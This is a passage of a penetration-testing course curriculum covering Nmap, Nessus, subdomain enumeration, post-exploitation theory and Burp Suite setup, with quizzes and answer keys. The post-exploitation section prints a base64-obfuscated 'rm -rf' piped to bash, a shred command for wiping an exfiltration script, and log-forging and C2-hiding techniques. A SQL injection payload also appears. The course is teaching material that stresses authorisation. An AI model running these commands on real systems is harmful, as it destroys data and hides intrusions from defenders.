- Nikto (nikto -h target.com) actively probes a web server for outdated versions, dangerous files, and misconfigurations — one of the listed 'attempts to find vulnerabilities' steps alongside Nmap
- Always obtain explicit permission, document all activity, and follow the agreed Rules of Engagement before any active recon

```bash
ping example.com
traceroute example.com
nmap -sn 192.168.1.0/24
nc <target> <port>
photon -u http://example.com -t 3 -l 2
cewl -d 2 -w passlist.txt http://example.com
dnsrecon -d example.com -t std
dig axfr example.com @ns1.example.com
nikto -h target.com
```

**Resources:**

- [Nmap official documentation](https://nmap.org/book/man.html) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. What must be true before conducting active recon, per this topic?
   - Nothing, active recon requires no authorisation
   - **Explicit permission must be obtained and Rules of Engagement followed** ✓
   - Only passive recon requires authorisation
   - Active recon is always illegal regardless of authorisation
   > Active recon directly touches the target, so explicit authorisation and documented activity within the Rules of Engagement are required first.
2. Banner grabbing is used to:
   - Encrypt traffic between hosts
   - **Reveal exact service versions from response headers/banners** ✓
   - Perform a DNS zone transfer only
   - Bypass a WAF automatically
   > Banner grabbing captures service version information directly from a service's response banner/headers.
3. A ping sweep is primarily used to:
   - Crack passwords
   - **Map which hosts on a network range are alive** ✓
   - Bypass a firewall entirely
   - Encrypt DNS queries
   > Ping sweeps identify live hosts across an IP range before more detailed per-host scanning begins.

#### 89. Nmap: Host Discovery, Port Scanning, Version Detection, OS Detection `[theory]` — Week 7

Nmap is the core scanning tool of the entire programme — host discovery, port scanning, service/version detection, and OS fingerprinting in one tool. The Network Scanning & Service Enumeration material walks through it as a funnel: first confirm which hosts are alive using a ping sweep (nmap -sn, or fping) or an ARP scan, then run DNS enumeration (nslookup, dnsenum, dig) to pull hostnames, then find which ports are open on those hosts, then fingerprint the exact service and version behind each port so it can be checked against known CVEs.

**Key Points:**

- Host discovery/ping sweep (nmap -sn, or fping) finds which hosts on a range are alive before scanning each individually
- A full TCP scan across all 65535 ports is thorough but slow — running nmap with no scan-type flag defaults to the top-1000 TCP ports only, so start there
- -sV detects service versions; -O attempts OS fingerprinting
- On local networks, ARP scanning (arp-scan, or nmap -PR) is used instead of ICMP for host discovery, since ARP works at layer 2 even when ICMP is filtered
- -sS (TCP SYN / 'stealth' scan) is commonly paired with -p- for a faster full-port sweep
- UDP scanning (-sU) is slower than TCP but necessary to find services like DNS, SNMP, and TFTP that don't run over TCP
- TCP and UDP can be scanned together in one pass for fuller enumeration across both protocols
- DNS enumeration (nslookup, dnsenum, dig) identifies hostnames from DNS as a discovery step that complements ping sweeps and ARP scans

```bash
nmap -sn 192.168.0.0/24
nmap <target-ip>
nmap -p- <target-ip>
nmap -sV -O <target-ip>
nmap -sU <target-ip>
nmap -sS -p- <target-ip>
nmap -p 21,22,80,443 <target-ip>
nmap -sS -sU -p T:1-1024,U:1-100 <target-ip>
```

**Resources:**

- [Nmap official documentation](https://nmap.org/book/man.html) _(link)_
- [Nmap Network Scanning book](https://nmap.org/book/toc.html) _(link)_

**Quick Quiz:**

1. Which Nmap flag attempts OS fingerprinting?
   - -sV
   - **-O** ✓
   - -sn
   - -sU
   > -O attempts OS detection/fingerprinting, while -sV detects service versions.
2. What does 'nmap -sn 192.168.0.0/24' do?
   - Performs a full UDP scan
   - **Performs a host-discovery/ping sweep without port scanning** ✓
   - Performs OS detection only
   - Scans all 65535 TCP ports
   > -sn performs host discovery (ping sweep) without scanning ports on discovered hosts.
3. Why might a pentester start with the default top-1000 ports rather than a full 'nmap -p-' scan?
   - **Because the top-1000 covers the most commonly used services faster, before running the slower, more thorough full scan** ✓
   - Because full scans are illegal
   - Because -p- only scans UDP ports
   - Because top-1000 scans are always more accurate
   > A full 65535-port scan is thorough but slow, so scanning the common top-1000 ports first gives a faster initial picture.

#### 90. Nmap NSE Scripts for Service Enumeration `[theory]` — Week 7

The Nmap Scripting Engine (NSE) extends Nmap with hundreds of scripts for deeper enumeration and even vulnerability detection. The source material frames the whole process as three linked steps: accurately detect the service version, run automated NSE/vuln scripts against it, then manually cross-check the exact version against CVE databases and exploit code before treating anything as confirmed — alongside NSE, protocol-specific tools like enum4linux (SMB/NetBIOS) and snmpwalk (SNMP) round out enumeration of protocols such as FTP, SMB, SNMP, HTTP, and SSH.

**Key Points:**

- --script vuln runs a broad set of vulnerability-detection scripts against discovered services
- Named vulnerability scripts include smb-vuln-ms17-010 and http-vuln-cve2020-3452
- Worked example: nmap -sV finds vsftpd 2.3.4 → cross-reference against CVE Details/Exploit-DB reveals CVE-2011-2523 (a known backdoor)
- Manual banner grabbing (nc, telnet, or curl) confirms exactly what a service reports itself as, e.g. a raw FTP banner reading '220 ProFTPD 1.3.5 Server (Debian)'
- Nikto complements NSE for web servers specifically — detecting outdated server versions, directory traversal issues, and default files that generic NSE scripts might miss
- After version fingerprinting, manual CVE research means cross-referencing CVE Details/NVD/Exploit-DB plus vendor advisories, Metasploit modules, and GitHub PoCs — not just trusting the NSE script output
- Second worked example from the source: nmap -sV against ports 21/22/80 turning up Apache 2.2.8 on port 80 alongside the vsftpd 2.3.4 backdoor — the Apache version then gets searched for CVEs and verified with Nikto or manual directory fuzzing
- Protocol-specific enumeration tools alongside NSE: enum4linux for SMB/NetBIOS, and snmpwalk for SNMP — covering common protocols such as FTP, SMB, SNMP, HTTP, and SSH

```bash
nmap --script vuln <target>
nmap --script=banner <target>
nmap -sV -p 21,22,80 <target>
nc <target> <port>
nikto -h http://<target>
```

**Resources:**

- [Nmap NSE documentation](https://nmap.org/book/nse.html) _(link)_
- [Nmap NSE script library](https://nmap.org/nsedoc/) _(link)_

**Quick Quiz:**

1. What does the --script vuln option do in Nmap?
   - Runs a single targeted exploit
   - **Runs a broad set of vulnerability-detection NSE scripts against discovered services** ✓
   - Only performs host discovery
   - Disables service version detection
   > --script vuln runs Nmap's collection of vulnerability-detection scripts across the scanned services.
2. In the worked example, discovering vsftpd 2.3.4 via -sV and then checking CVE Details/Exploit-DB revealed which known issue?
   - A DNS cache poisoning vulnerability
   - **A known backdoor (CVE-2011-2523)** ✓
   - A buffer overflow in SSH
   - A weak TLS cipher suite
   > vsftpd 2.3.4 is known to contain a backdoor tracked as CVE-2011-2523, discoverable by cross-referencing the -sV version output.
3. What is a named example of an NSE script targeting a specific known vulnerability?
   - **smb-vuln-ms17-010** ✓
   - ping-sweep
   - arp-scan
   - port-list
   > smb-vuln-ms17-010 is a named NSE script specifically checking for the MS17-010 (EternalBlue) SMB vulnerability.

#### 91. Subdomain Enumeration (subfinder, amass, dnsx) `[theory]` — Week 7

Subdomains often run older, forgotten, or less-hardened applications — enumerating them expands the attack surface dramatically beyond just the main domain. The source walkthrough shows this done manually through Netcraft's Site Report: looking up a domain, then clicking through its Network section reveals not just subdomains but the netblock and OS fingerprint attached to each one.

**Key Points:**

- subfinder/amass/dnsx passively query multiple sources (certificate transparency logs, DNS records, search engines) to enumerate subdomains at scale
- Complementary manual sources: Netcraft Site Report, crt.sh (certificate transparency), SecurityTrails, DNSDumpster
- Netcraft Site Report walkthrough: Resources -> Tools -> Site Report -> look up the domain -> click the Domain link in the Network section to reveal its subdomains with netblock/OS info attached
- Sublist3r and Pentest-Tools' Find Subdomains are named as lightweight alternatives for the same passive subdomain discovery
- YouGetSignal's Reverse IP Domain Check reveals other domains hosted on the same server as the target — useful for finding sibling sites sharing infrastructure
- SecurityTrails' Subdomains tab plus its Historical Data tab (A/AAAA/MX/NS/SOA/TXT records over time) round out DNS-based subdomain mapping

```bash
subfinder -d example.com
amass enum -d example.com
dnsx -l subdomains.txt -a
```

**Resources:**

- [subfinder (ProjectDiscovery)](https://github.com/projectdiscovery/subfinder) _(tool)_
- [OWASP Amass](https://github.com/owasp-amass/amass) _(tool)_
- [crt.sh](https://crt.sh) _(tool)_

**Quick Quiz:**

1. What data sources do tools like subfinder and amass typically query?
   - Only the target's internal DNS server
   - **Certificate transparency logs, DNS records, and search engines** ✓
   - Only social media profiles
   - Only WHOIS records
   > subfinder/amass/dnsx passively query multiple public sources including certificate transparency logs and DNS records.
2. crt.sh is a manual source used for which recon purpose?
   - Cracking password hashes
   - **Certificate transparency log lookups to find subdomains** ✓
   - Performing active Nmap scans
   - Analysing PCAP files
   > crt.sh lets you search certificate transparency logs, often revealing subdomains registered on certificates.
3. Why is subdomain enumeration valuable to an attacker/pentester?
   - Subdomains never run any applications
   - **Subdomains often run older, forgotten, or less-hardened applications, expanding the attack surface** ✓
   - It reduces the attack surface
   - It replaces the need for port scanning entirely
   > Forgotten/legacy subdomains frequently run outdated or misconfigured applications, significantly expanding what's exploitable.

#### 92. Vulnerability Scanning with Nessus & OpenVAS `[theory]` — Week 7

Automated vulnerability scanners check discovered services against huge databases of known CVEs and misconfigurations, turning raw Nmap output into a prioritised risk list. The source material distinguishes Network Vulnerability Scanning (targeting servers, routers & firewalls, laptops & mobile devices, and IoT devices for open ports, outdated firmware, misconfigured services, and malware, via Nessus/OpenVAS) from Web Vulnerability Scanning (targeting web apps for XSS/SQLi/misconfigured auth, via Burp Suite/Nikto/OWASP ZAP/Nuclei) — this module focuses on the network side. It is non-intrusive testing by design (no active exploitation), and its value extends beyond finding bugs to meeting compliance regimes like GDPR, HIPAA, and PCI-DSS and pre-empting malware, ransomware, and unauthorized access before they become incidents.

**Key Points:**

- Process: find devices → check for weaknesses → assess risk (Critical/High/Medium/Low) → remediate
- Scan types: External vs Internal, Credentialed (deeper, logged-in) vs Non-Credentialed
- Nessus (commercial, free Essentials tier) vs OpenVAS (fully free/open-source alternative)
- Compliance scanning modes exist for standards like PCI-DSS, HIPAA, and NIST
- Nessus scan types named in the source: Host Discovery, Basic Network Scan, Advanced Scan (custom config), Malware Scan, Web Application Tests, and Patch Audits
- Risk categories defined concretely: Critical = needs immediate action (e.g. sensitive data exposure), High = major risk exploitable any moment, Medium = moderate/can wait, Low = minor concern
- Other tools in the same space: OpenVAS (free), QualysGuard (cloud-based), Acunetix (web security scanner) — alongside Nmap for the underlying port/service discovery
- Known limitations: false positives (flagged issues that aren't real), slow performance on large scans, and the need for regular signature updates
- Best practice cadence: scan at least monthly or after major changes, run both external and internal scans, and fix findings quickly rather than letting them queue up
- Devices in scope for a scan span servers, routers & firewalls, laptops & mobile devices, and IoT devices — not just internet-facing servers
- Checks performed include spotting outdated software, weak passwords, misconfigured firewalls (unwarranted access via open ports), and malware or other suspicious activity already present on a host
- GDPR is also named alongside PCI-DSS/HIPAA/NIST as a compliance standard that vulnerability scanning helps satisfy
- Beyond false positives, the source also lists false negatives (real vulnerabilities that go undetected) and an inability to simulate complex attack scenarios as limitations — noting scanning is cost-effective compared to full penetration testing precisely because of that narrower scope

**Resources:**

- [Nessus Essentials](https://www.tenable.com/products/nessus/nessus-essentials) _(tool)_
- [Greenbone/OpenVAS](https://www.greenbone.net) _(tool)_

**Quick Quiz:**

1. What is the difference between a credentialed and non-credentialed vulnerability scan?
   - **Credentialed scans log in to the target for deeper visibility; non-credentialed scans do not** ✓
   - They produce identical results always
   - Non-credentialed scans are always more thorough
   - Credentialed scans cannot be run internally
   > Credentialed scans authenticate to the target for deeper, more accurate findings, while non-credentialed scans only see what's visible externally.
2. What is Nessus's free tier called?
   - Nessus Pro
   - **Nessus Essentials** ✓
   - Nessus Cloud
   - OpenVAS Free
   > Nessus Essentials is Tenable's free tier of the Nessus vulnerability scanner.
3. What is the general vulnerability-scanning workflow described in this topic?
   - Exploit first, then scan
   - **Find devices, check for weaknesses, assess risk (severity), then remediate** ✓
   - Remediate before scanning
   - Cover tracks then scan
   > The described workflow is: find devices, check for weaknesses, assess risk by severity, then remediate.

#### 93. Privilege Escalation Theory - Vertical & Horizontal `[theory]` — Week 7

Introduced conceptually here, and put into hands-on practice in M11 — privilege escalation is about gaining access beyond what you were originally granted. The source material frames vertical escalation as 'climbing a ladder' to admin or root access for full control of the system, giving exploiting a vulnerable kernel to gain root access as a concrete example alongside the more web-focused causes covered later.

**Key Points:**

- Vertical: a lower-privileged user gains admin/root access (e.g. a regular user reaching an admin dashboard)
- Horizontal: a user accesses another same-level user's data (e.g. User A viewing User B's private files)
- Common enabling flaws: IDOR (predictable IDs), client-side role manipulation, missing server-side authorization checks
- Concrete example of vertical escalation named in the source material: exploiting a vulnerable kernel to gain root access — described as 'climbing the ladder' to admin/root for full control of the system

**Resources:**

- [GTFOBins](https://gtfobins.github.io) _(link)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_

**Quick Quiz:**

1. Vertical privilege escalation is best described as:
   - A user accessing another same-level user's data
   - **A lower-privileged user gaining admin/root access** ✓
   - Encrypting a file with a stronger algorithm
   - Scanning a wider IP range
   > Vertical privesc means a lower-privileged user gains higher (e.g. admin/root) privileges.
2. Horizontal privilege escalation is best described as:
   - A regular user reaching an admin dashboard
   - **A user accessing another same-level user's data (e.g. User A viewing User B's files)** ✓
   - Root gaining more root access
   - Scanning subdomains
   > Horizontal privesc involves accessing another user's data at the same privilege level, rather than gaining a higher privilege tier.
3. Which of the following is named as a common flaw enabling privilege escalation?
   - Strong password hashing
   - **IDOR (predictable IDs)** ✓
   - TLS 1.3 usage
   - DNSSEC
   > IDOR (predictable object references), client-side role manipulation, and missing server-side authorization checks are named as common enabling flaws.

#### 94. Post-Exploitation (Persistence, Lateral Movement, Data Exfiltration, Covering Tracks) `[theory]` — Week 7

What happens after an initial foothold is gained — covered here at a theory level, expanded hands-on in M11. The source material frames maintaining access as ensuring an attacker can repeatedly get back into a system they've already compromised, even after a reboot or a defender's cleanup effort, achieved through three overlapping tracks: persistence mechanisms (scheduled tasks, registry edits, backdoors), privilege escalation to retain control with higher-level permissions, and stealth methods to avoid detection by antivirus or administrators. Covering tracks then closes the loop with concrete techniques of its own — editing logs to replace a real login event with an innocuous one, obfuscating a command by base64-encoding it before piping it to bash, securely wiping files with tools like shred so they can't be recovered, and routing command-and-control traffic through a VPN or a TOR proxy chain to hide the attacker's real IP.

**Key Points:**

- Persistence: mechanisms (scheduled tasks, registry Run keys, cron jobs) to survive reboot/reconnect
- Lateral movement: pivoting from the first compromised host to others in the network
- Data exfiltration: extracting data out of the target environment, often over covert channels
- Covering tracks: clearing logs/artefacts — relevant only within an authorised red-team scope
- Persistence also includes backdoors (hidden entry points that bypass normal authentication), web shells (malicious scripts uploaded to a web server for remote access), creating new unauthorized user accounts to maintain administrative access, and rootkits to help attackers stay hidden while maintaining access
- Concrete persistence example from the source: a hacker modifies the Windows registry so their backdoor program launches every time the system starts, surviving reboots
- Stealth methods are a third track alongside persistence and privilege escalation — techniques specifically aimed at avoiding detection by antivirus software or system administrators
- Log cleansing example: an attacker edits the log entry recording their login ('User admin logged in from IP 192.168.1.5 at 10:30 AM') and replaces it with an innocuous one ('System maintenance initiated by admin at 10:30 AM')
- Command obfuscation example: instead of running rm -rf /sensitive_data directly, an attacker base64-encodes it and pipes it through bash to hide the command from casual log review
- Secure deletion example: tools like shred or srm (e.g. shred -u exfil_script.sh) overwrite a file multiple times before removing it so it can't be recovered
- Network concealment: routing C2 traffic through a VPN or a proxy chain using tools like TOR hides the attacker's real IP and encrypts the traffic to make it harder to trace

```bash
echo cm0gLXJmIC9zZW5zaXRpdmVfZGF0YQ== | base64 -d | bash
shred -u exfil_script.sh
```

**Resources:**

- [MITRE ATT&CK](https://attack.mitre.org) _(link)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_

**Quick Quiz:**

1. Which post-exploitation activity involves moving from the initial compromised host to others in the network?
   - Persistence
   - **Lateral movement** ✓
   - Data exfiltration
   - Covering tracks
   > Lateral movement is pivoting from the first compromised host to other systems within the network.
2. Registry Run keys and cron jobs are examples of which post-exploitation activity?
   - Data exfiltration
   - **Persistence mechanisms to survive reboot/reconnect** ✓
   - Lateral movement
   - Reconnaissance
   > Scheduled tasks, registry Run keys, and cron jobs are common persistence mechanisms.
3. When is 'covering tracks' ever appropriate according to this programme?
   - In every engagement automatically
   - **Only within an authorised red-team scope** ✓
   - Only for unauthorised attackers
   - Never under any circumstances
   > Covering tracks (clearing logs/artefacts) is only relevant within an authorised red-team engagement's defined scope.

#### 95. Penetration Testing Report Structure `[theory]` — Week 7

A finding is only as valuable as the report explaining it — this is the deliverable clients actually pay for and act on.

**Key Points:**

- Required sections: Executive Summary (non-technical), Detailed Findings, Business Impact (CVSS scoring), Exploitation Difficulty (Easy/Medium/Hard), Remediation Recommendations, Strategic Recommendations
- Compliance-standard reporting frameworks differ: PCI-DSS, CREST, CERT, FedRAMP, CHECK each require different elements
- Best practices: know your audience, prioritise by severity/exploitability, include screenshots/PoC evidence, proofread scores carefully

**Resources:**

- [PTES (Penetration Testing Execution Standard)](http://www.pentest-standard.org) _(link)_
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_

**Quick Quiz:**

1. Which section of a pentest report is intended for a non-technical audience?
   - Detailed Findings
   - **Executive Summary** ✓
   - Exploitation Difficulty ratings
   - Strategic Recommendations only
   > The Executive Summary is specifically written for a non-technical audience, unlike the Detailed Findings section.
2. Business Impact in a pentest report is typically expressed using:
   - **CVSS scoring** ✓
   - Base64 encoding
   - VLAN IDs
   - ARP tables
   > Business Impact/severity is typically scored using the CVSS (Common Vulnerability Scoring System).
3. Which compliance-standard reporting frameworks are named as differing in required elements?
   - HTTP and DNS
   - **PCI-DSS, CREST, CERT, FedRAMP, CHECK** ✓
   - TCP and UDP
   - RSA and AES
   > PCI-DSS, CREST, CERT, FedRAMP, and CHECK are named as distinct compliance reporting frameworks with different required elements.

#### 96. Rules of Engagement & Scoping (Legal & Ethical) `[theory]` — Week 7

Before any active testing begins, scope and Rules of Engagement (RoE) must be explicitly agreed with the client/management — this is what makes the difference between a pentest and a crime. The source material states this as a hard gate specifically before active footprinting/scanning begins ('before you begin, always discuss and define the scope with management to establish Rules of Engagement') — passive reconnaissance doesn't require this because it never touches the target, but the moment any technique interacts directly with target systems (ping, Nmap, DNS zone transfer attempts, etc.), RoE must already be in place.

**Key Points:**

- RoE defines exactly what's in scope, what's off-limits, testing windows, and emergency contacts
- Discuss and define scope with management before any active technique is used
- Written authorisation must exist before touching any system you don't personally own
- The passive/active split in this module is also the practical scope boundary: passive techniques (OSINT, WHOIS, Netcraft, Shodan) carry no RoE risk since nothing touches the target; active techniques (ping, Nmap, DNSRecon zone transfers, Nikto) all require it first
- The source deck states it plainly: looking at public information is fine, but testing systems directly without approval is not — and can be illegal
- The source's ethical-considerations checklist also includes respecting the privacy and legal boundaries of the target organization, alongside obtaining explicit permission, documenting all activities, and following the agreed rules of engagement

**Resources:**

- [PTES Pre-engagement](http://www.pentest-standard.org) _(link)_
- [SANS Institute](https://www.sans.org) _(link)_

**Quick Quiz:**

1. What must a Rules of Engagement (RoE) document define?
   - Only the final invoice amount
   - **Exactly what's in scope, what's off-limits, testing windows, and emergency contacts** ✓
   - The pentester's personal salary
   - The target's marketing materials
   > RoE defines scope boundaries, off-limits systems, testing windows, and emergency contacts before testing begins.
2. What must exist before touching any system you don't personally own?
   - A verbal agreement only
   - **Written authorisation** ✓
   - A Shodan search
   - A completed Nmap scan
   > Written authorisation must be obtained before any active technique is used against a system you don't own.
3. When should scope be discussed and defined with management?
   - After the engagement is complete
   - **Before any active technique is used** ✓
   - Only if a vulnerability is found
   - Only during covering tracks
   > Scope and RoE must be agreed with management before any active testing begins.

#### 97. Lab: Passive OSINT + Nmap scan + Nessus scan on a test target `[lab]` — Week 7

An end-to-end recon exercise chaining everything in this module — passive OSINT, then an active Nmap scan, then a Nessus vulnerability scan against a lab VM (e.g. Metasploitable2). The source material's own vulnerability-scanning demo follows this exact chain and names the same lab target: 'Nessus Scan Demo and Analyse vulnerabilities from Metasploitable machine' against Metasploitable2.

**Key Points:**

- Start passive: WHOIS, Shodan, Netcraft, Google Dorking on the test domain
- Move to active: full Nmap scan (-sV -O -p-) to enumerate live hosts/ports/services
- Install Nessus Essentials, run a Basic Network Scan against the lab VM, and categorise findings by severity
- Produce a short recon report: open ports, services, OS, subdomains, and any known CVEs found
- Passive stage sources to actually pull from: WHOIS, Shodan (hostname:"target"), Netcraft Site Report, crt.sh, DNSDumpster/SecurityTrails, and Google Dorking (site:target filetype:pdf "confidential")
- Active stage: host discovery before the full scan, then a combined ports+versions+OS pass, then an NSE vulnerability pass
- Nessus stage: New Scan -> Basic Network Scan against the VM's IP, then group results by Critical/High/Medium/Low before writing anything up
- For every finding, cross-reference the exact service version against CVE Details/NVD/Exploit-DB rather than trusting the scanner label alone — mirrors the vsftpd 2.3.4 / CVE-2011-2523 worked example from the Nmap module

```bash
nmap -sn <subnet>
nmap -p- -sV -O <target>
nmap --script vuln <target>
```

**Resources:**

- [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/) _(tool)_
- [Nmap official documentation](https://nmap.org/book/man.html) _(link)_
- [Nessus Essentials](https://www.tenable.com/products/nessus/nessus-essentials) _(tool)_

**Quick Quiz:**

1. What is the correct order of activities in this end-to-end recon lab?
   - Nessus scan, then Nmap scan, then passive OSINT
   - **Passive OSINT, then active Nmap scan, then Nessus vulnerability scan** ✓
   - Nmap scan, then passive OSINT, then Nessus scan
   - All three run simultaneously with no order
   > The lab explicitly starts with passive OSINT, moves to active Nmap scanning, then finishes with a Nessus vulnerability scan.
2. Which lab VM is named as a common target for this style of exercise?
   - Windows 11 Pro
   - **Metasploitable2** ✓
   - macOS Ventura
   - iOS 17
   > Metasploitable2 is the named example lab VM used for this Nmap/Nessus recon exercise.
3. What should the final recon report from this lab include?
   - Only a list of employee names
   - **Open ports, services, OS, subdomains, and any known CVEs found** ✓
   - Only the Nessus installation steps
   - A single screenshot with no analysis
   > The lab asks for a short recon report covering open ports, services, OS, subdomains, and any known CVEs discovered.


---

## M8: Burp Suite 101

**Month 2** · Week 8 · 11 topics

Burp Suite is the industry-standard intercepting proxy for web application penetration testing — nearly every lab in M9 and M10 assumes you can already intercept, modify, repeat, and fuzz HTTP requests confidently.

**Learning Outcomes:**

- Configure Burp's proxy alongside a browser (FoxyProxy) to intercept traffic
- Intercept and modify live HTTP requests before they reach the server
- Use Repeater to manually iterate on a request/payload
- Use Intruder to automate fuzzing and credential-spraying attacks
- Use Decoder to encode/decode payloads on the fly

**Module Resources:**

- [PortSwigger Web Academy Burp Suite Path](https://portswigger.net/web-security) _(platform)_
- [DVWA](https://github.com/digininja/DVWA) _(tool)_
- [FoxyProxy](https://getfoxyproxy.org) _(tool)_
- [PortSwigger Burp Suite documentation](https://portswigger.net/burp/documentation) _(link)_

**Module Quiz (10 questions):**

1. Which sequence correctly reflects the standard Burp Suite testing workflow for manually testing a parameter for SQL injection?
   - Decoder, then Comparer, then Scanner
   - **Intercept the request, Send to Repeater, inject and iterate on payloads, observe response differences** ✓
   - Sequencer, then Intruder, then Decoder
   - Target Scope, then Nessus, then Report
   > The standard manual-testing workflow is capturing via Proxy/Intercept, sending to Repeater, then iterating payloads and observing responses.
2. Why is installing Burp's CA certificate a prerequisite for effectively testing HTTPS traffic?
   - **Because Burp performs a man-in-the-middle on TLS, and without the CA trusted, the browser will show certificate warnings** ✓
   - Because HTTP traffic cannot be intercepted without it
   - Because it enables the Scanner tool
   - Because it changes the default proxy port
   > Burp decrypts and re-encrypts HTTPS traffic as a MITM proxy; trusting its CA certificate avoids browser warnings during this process.
3. A tester wants to brute-force a login form with both a username list and a password list, testing every combination. Which Intruder attack type is correct?
   - Sniper
   - **Cluster Bomb** ✓
   - Battering Ram
   - Pitchfork attack type in Scanner
   > Testing every combination of two independent payload sets (username x password) across two positions is exactly what Cluster Bomb in Intruder is designed for.
4. Why does the Community edition's lack of an automated Scanner make Repeater and Intruder especially important in this course?
   - **Because without Scanner's automated crawling/testing, manual tools are the primary means of discovering and confirming vulnerabilities** ✓
   - Because Repeater and Intruder replace the need for a proxy
   - Because Scanner is required to even intercept traffic
   - Because Community edition cannot capture HTTP traffic at all
   > Since Community lacks the automated Scanner (a Professional-only feature), manual tools like Repeater and Intruder become the primary way to find and confirm vulnerabilities.
5. What is the security implication of Burp being able to freely modify a request after Intercept captures it but before the server sees it?
   - **It proves that client-side-only validation and hidden form fields can never be trusted as security controls, since the raw request can always be edited** ✓
   - It has no security implication
   - It only affects encoding, not application logic
   - It means HTTPS itself is broken
   > Since a proxy can freely edit any request field before it reaches the server, any check enforced only in the browser/JS is not a real security control.
6. Why would a tester URL-encode a payload like ' OR 1=1 -- using Ctrl+U in Repeater before sending it?
   - To make it render as valid HTML
   - **To ensure special characters in the payload are properly transmitted within the URL/query string without being mangled** ✓
   - To disable the WAF automatically
   - To convert it into a hash
   > URL-encoding ensures special characters like spaces and quotes in the payload survive transmission correctly as part of the request.
7. A pentester adds only the target application's domain to Burp's Scope. What is the direct benefit during a multi-hour testing session?
   - It automatically encrypts all traffic
   - **It filters the Site map/HTTP History to relevant in-scope traffic, reducing noise from ads/trackers/unrelated domains** ✓
   - It disables Intercept
   - It replaces the need for FoxyProxy
   > Scope filtering keeps the Site map and HTTP History focused on the actual target, cutting out unrelated third-party noise.
8. In the Intruder password-spray lab against DVWA, why is Grep-Match essential rather than manually reading every response?
   - Grep-Match automatically cracks the password hash
   - **Grep-Match flags which specific response(s) contain a success-only string, letting the tester instantly spot the valid credential among potentially hundreds of attempts** ✓
   - Grep-Match encrypts the wordlist
   - Grep-Match is required to enable the Sniper attack type
   > With many payload attempts, manually reviewing every response is impractical -- Grep-Match automatically flags the response(s) matching a success indicator.
9. Which statement correctly distinguishes Burp's passive and active scanning (Professional edition)?
   - Passive scanning sends additional crafted requests; active scanning only observes existing traffic
   - **Passive scanning analyses your normal traffic without extra requests; active scanning proactively sends crafted/malicious requests to probe for issues** ✓
   - Both are identical and interchangeable
   - Passive scanning is only available in Community edition
   > Passive scanning is non-intrusive, analysing existing traffic; active scanning proactively sends test payloads to look for vulnerabilities.
10. What is the fundamental reason Burp Suite is described as essential preparation for the OWASP Top 10 modules (M9/M10) that follow?
   - **Because those modules require intercepting, modifying, repeating, and fuzzing HTTP requests, which are exactly the skills built with Burp's Proxy/Repeater/Intruder/Decoder** ✓
   - Because Burp Suite performs automatic exploitation with no manual skill required
   - Because M9/M10 only test thick client applications
   - Because Burp Suite is a vulnerability scanner unrelated to manual testing
   > Nearly every later web-attack lab assumes fluency with Burp's core manual tools for intercepting, modifying, repeating, and fuzzing requests.

### Topics

#### 98. What is Burp Suite & Why Pentesters Use It `[theory]` — Week 8

Burp Suite is a Java-based framework built as a comprehensive solution for web application penetration testing — it has become the industry-standard tool for hands-on security assessments of web and mobile applications, including those built on APIs. At its core, Burp captures and lets you manipulate all HTTP/HTTPS traffic passing between a browser and a web server, which is why nearly every later technique in this course (manual SQLi, login bypass, credential spraying) is really just a specific way of using one of Burp's core tools.

**Key Points:**

- Proxy is the most renowned Burp feature: it intercepts requests/responses and lets you inspect the exact request the browser sent alongside the response's length and status code (Proxy > HTTP History)
- Repeater captures, modifies, and resends the same request repeatedly — the go-to tool for trial-and-error payload crafting (e.g. SQL injection) or enumerating a parameter like productId across many values
- Intruder sprays endpoints with many request variations for brute-force or fuzzing; even Community edition (which rate-limits it versus Professional) is commonly used this way
- Decoder encodes a payload before sending it to the target, or decodes captured data — e.g. URL-encoding a JavaScript payload and then decoding it back to check the round trip
- Comparer compares two pieces of captured data at the word or byte level and highlights differences between two responses; a single keyboard shortcut sends large data segments straight to it
- Sequencer analyzes the randomness (entropy) of tokens such as session cookies — if the algorithm generating them lacks secure randomness, that low entropy exposes a real attack avenue
- Getting started: launch Burp, accept the terms, pick a project type (Community's options are limited, so you can just click Next), keep the default configuration, then click Start Burp to reach the main dashboard
- The dashboard's top bar lists every available tool, and the Target site map automatically builds a tree of the application as you browse through it — but only while the proxy is switched on

**Resources:**

- [PortSwigger Burp Suite documentation](https://portswigger.net/burp/documentation) _(link)_
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) _(platform)_

**Quick Quiz:**

1. Which Burp Suite edition rate-limits Intruder attacks?
   - Professional
   - **Community (free)** ✓
   - Enterprise
   - Burp Suite DAST
   > The free Community edition throttles/rate-limits Intruder attacks, unlike the paid Professional edition.
2. Which of the following is NOT one of Burp's core tools listed for this topic?
   - Repeater
   - Intruder
   - Decoder
   - **Wireshark** ✓
   > Wireshark is a separate packet-capture tool; Burp's core tools include Proxy, Repeater, Intruder, Decoder, Comparer, and Sequencer.
3. What does Burp Suite fundamentally allow a tester to do?
   - Only view network cabling diagrams
   - **Capture and manipulate all HTTP/HTTPS traffic between browser and server** ✓
   - Crack password hashes offline
   - Perform Wi-Fi packet injection
   > Burp is a proxy-based framework for capturing and manipulating HTTP/HTTPS traffic between the browser and the server.

#### 99. Step-by-Step: Configure Burp Proxy + Browser (Firefox + CA cert install) `[setup]` — Week 8

Getting your own browser's traffic to actually flow through Burp is the first real hurdle every new user hits. Burp ships its own embedded Chromium browser that intercepts traffic out of the box, but it's far more convenient to configure your everyday browser to route through Burp's proxy on demand using the FoxyProxy extension — done once, it stays configured for the rest of the course.

**Key Points:**

- Burp's proxy listener runs on 127.0.0.1:8080 by default — visible under Burp's proxy listener settings
- Burp Suite also bundles its own Chromium-based browser preconfigured to intercept traffic, as an alternative to setting up your own browser with an extension
- Install the FoxyProxy extension, then open its proxy configuration section
- Set FoxyProxy's proxy entry to hostname 127.0.0.1 and port 8080 to match Burp's default listener
- Enable the proxy through the FoxyProxy toolbar icon whenever you want your browser's traffic routed through Burp
- Launching Burp itself: accept the terms and conditions, choose a project type (Community's choices are limited, so click Next), keep the recommended default configuration, then click Start Burp to open the main interface

**Resources:**

- [PortSwigger - Getting started with Burp Proxy](https://portswigger.net/burp/documentation/desktop/getting-started) _(link)_
- [FoxyProxy](https://getfoxyproxy.org) _(tool)_

**Quick Quiz:**

1. What port does Burp's proxy listen on by default?
   - 127.0.0.1:80
